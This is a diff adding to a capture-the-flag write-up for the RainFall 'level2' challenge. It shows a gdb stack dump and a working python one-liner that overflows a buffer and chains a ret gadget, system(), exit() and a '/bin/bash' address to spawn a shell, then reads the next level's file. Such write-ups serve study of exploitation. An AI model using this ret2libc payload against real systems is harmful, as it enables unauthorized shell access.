@@ -64,3 +64,41 @@ Dump of assembler code for function p:
    0x0804853e <+106>:	ret
    ```
    > ret = 0x0804853e
+
+
+```sh
+(gdb) x/80x $esp
+0xbffff6c0:     0xbffff6dc      0x00000000      0x00000000      0xb7e5ec73
+0xbffff6d0:     0x080482b5      0x00000000      0x00ca0000      0x48484848
+0xbffff6e0:     0x48484848      0x48484848      0x48484848      0x48484848
+0xbffff6f0:     0x48484848      0x48484848      0x48484848      0x48484848
+0xbffff700:     0x48484848      0x48484848      0x48484848      0x48484848
+0xbffff710:     0x48484848      0x48484848      0x48484848      0x48484848
+0xbffff720:     0x48484848      0x48484848      0x48484848     [0x0804853e]
+0xbffff730:    [0xb7e6b060]    [0xb7e5ebe0]    [0xbffff91b]     0xb7e45400
+0xbffff740:     0x00000001      0xbffff7d4      0xbffff7dc      0xb7fdc858
+0xbffff750:     0x00000000      0xbffff71c      0xbffff7dc      0x00000000
+0xbffff760:     0x08048260      0xb7fd0ff4      0x00000000      0x00000000
+0xbffff770:     0x00000000      0xd68f971b      0xe1c8330b      0x00000000
+0xbffff780:     0x00000000      0x00000000      0x00000001      0x08048420
+0xbffff790:     0x00000000      0xb7ff26b0      0xb7e453e9      0xb7ffeff4
+0xbffff7a0:     0x00000001      0x08048420      0x00000000      0x08048441
+0xbffff7b0:     0x0804853f      0x00000001      0xbffff7d4      0x08048550
+0xbffff7c0:     0x080485c0      0xb7fed280      0xbffff7cc      0xb7fff918
+0xbffff7d0:     0x00000001      0xbffff8fc      0x00000000      0xbffff915
+0xbffff7e0:     0xbffff925      0xbffff939      0xbffff958      0xbffff96b
+0xbffff7f0:     0xbffff977      0xbffffe98      0xbffffea4      0xbffffef1
+```
+
+```sh
+level2@RainFall:~$ (python -c "print('H' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7'  + '\xe0\xeb\xe5\xb7' + '\x1b\xf9\xff\xbf')"; cat) | ./level2 
+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH>HHHHHHHHHHHH>`�������
+cat /home/user/level3
+level2@RainFall:~$ 
+```
+
+offset = 'H' * 80
+ret = '\x3e\x85\x04\x08'
+system = '\x60\xb0\xe6\xb7'
+exit = '\xe0\xeb\xe5\xb7'
+"/bin/bash" = '\x1b\xf9\xff\xbf'
